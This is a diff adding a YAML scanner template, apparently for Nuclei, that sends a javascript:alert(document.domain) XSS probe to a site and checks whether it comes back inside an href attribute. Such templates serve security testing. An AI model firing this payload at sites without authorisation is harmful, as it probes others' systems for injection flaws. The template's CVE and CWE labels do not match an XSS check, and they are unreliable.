@@ -1,0 +1,27 @@
+id: generic-custom-hrefxss
+
+info:
+  name: generic-custom-hrefxss 
+  author: osamahamad
+  severity: high
+  reference: generic-custom-hrefxss , inspired by my vuln in apple
+  description: |
+    custom
+    xss
+  tags: custom
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.80
+    cve-id: CVE-2021-25646
+    cwe-id: CWE-732
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/javascript:alert(document.domain)"
+
+    matchers:
+      - type: word
+        words:
+          - 'href="javascript:alert(document.domain)"'
+        part: body
